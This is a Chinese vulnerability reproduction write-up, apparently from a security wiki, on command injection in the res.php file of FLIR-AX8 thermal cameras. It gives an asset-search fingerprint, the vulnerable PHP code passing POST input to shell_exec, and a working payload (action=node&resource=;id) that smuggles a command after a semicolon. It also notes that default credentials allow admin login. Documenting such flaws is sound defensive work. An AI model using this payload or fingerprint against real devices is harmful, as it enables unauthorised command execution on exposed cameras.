---
title: "FLIR-AX8 res.php 后台命令执行漏洞"
date: 2026-10-18 09:14:29
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "FLIR-AX8"
tags:
  - "FLIR-AX8"
  - "命令执行"
  - "代码执行"
  - "弱口令"
  - "漏洞复现"
---
## 漏洞描述

FLIR-AX8 res.php 文件存在后台命令执行漏洞，攻击者通过默认口令登录后台后获取服务器权限

## 漏洞影响

```
FLIR-AX8
```

## 网络测绘

```
app="FLIR-FLIR-AX8"
```

## 漏洞复现

登录页面

![image-20220913103521047](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202209131036578.png)

出现漏洞的文件为 **res.php**

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">&lt;?php
	if (isset(&#36;_POST["action"])) {
		switch (&#36;_POST["action"]) {
			case "get":
				if(isset(&#36;_POST["resource"]))
				{
					switch (&#36;_POST["resource"]) {
						case ".rtp.hflip":
							if (!file_exists("/FLIR/system/journal.d/horizontal_flip.cfg")) {
								$result = "false";
								break;
							}
							$result = file_get_contents("/FLIR/system/journal.d/horizontal_flip.cfg") === "1" ? "true" : "false";
							break;
						case ".rtp.vflip":
							if (!file_exists("/FLIR/system/journal.d/vertical_flip.cfg")) {
								$result = "false";
								break;
							}
							$result = file_get_contents("/FLIR/system/journal.d/vertical_flip.cfg") === "1" ? "true" : "false";
							break;
						default:
							$result = trim(&#115;hell_&#101;xec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -o ".&#36;_POST["resource"]));
					}
				}
				break;
			case "set":
				if(isset(&#36;_POST["resource"]) and isset(&#36;_POST["value"])) {
					switch (&#36;_POST["resource"]) {
						case "rtp.hflip":
							file_put_contents("/FLIR/system/journal.d/horizontal_flip.cfg", &#36;_POST["value"] === "true" ? "1" : "0");
							break;
						case "rtp.vflip":
							file_put_contents("/FLIR/system/journal.d/vertical_flip.cfg", &#36;_POST["value"] === "true" ? "1" : "0");
							break;
						default:
							$result = trim(&#115;hell_&#101;xec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rset ".&#36;_POST["resource"]." ".&#36;_POST["value"]));;
					}
				}

				break;
			case "measurement":
				if (isset(&#36;_POST["type"]) &amp;&amp; isset(&#36;_POST["id"])) {
					$nodeData =  trim(&#115;hell_&#101;xec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.measureFuncs.".&#36;_POST["type"].".".&#36;_POST["id"]));
					$lines = explode("\n", $nodeData);
					foreach($lines as $line)
					{
						$resource = preg_split('/\s+/', $line);
						$value = trim($resource[1], "\"");
						$result[$resource[0]] = $value;
					}
				}
				break;
			case "global-parameters":
				$nodeData =  trim(&#115;hell_&#101;xec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.basicImgData.objectParams"));
				$lines = explode("\n", $nodeData);
				foreach($lines as $line)
				{
					$resource = preg_split('/\s+/', $line);
					$result[$resource[0]] = $resource[1];
				}
			case "alarm":
				if(isset(&#36;_POST["id"]))
				{
					$nodeData = trim(&#115;hell_&#101;xec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls .image.sysimg.alarms.measfunc.".&#36;_POST["id"]));
					$lines = explode("\n", $nodeData);
					foreach($lines as $line)
					{
						$resource = preg_split('/\s+/', $line);
						$value = trim($resource[1], "\"");
						$result[$resource[0]] = $value;
					}
				}
				break;
			case "calibrate":
				$result = &#115;hell_&#101;xec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/nuc");

				break;
			case "node":
				$nodes = trim(&#115;hell_&#101;xec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls ".&#36;_POST["resource"]));
				$result = preg_split("/\s+\n/", $nodes);
				break;
		}
		echo json_encode($result);
	}
?&gt;</code></pre>

</details>

验证POC

```
POST /res.php

action=node&resource=;id
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202209131037844.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/FLIR-AX8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
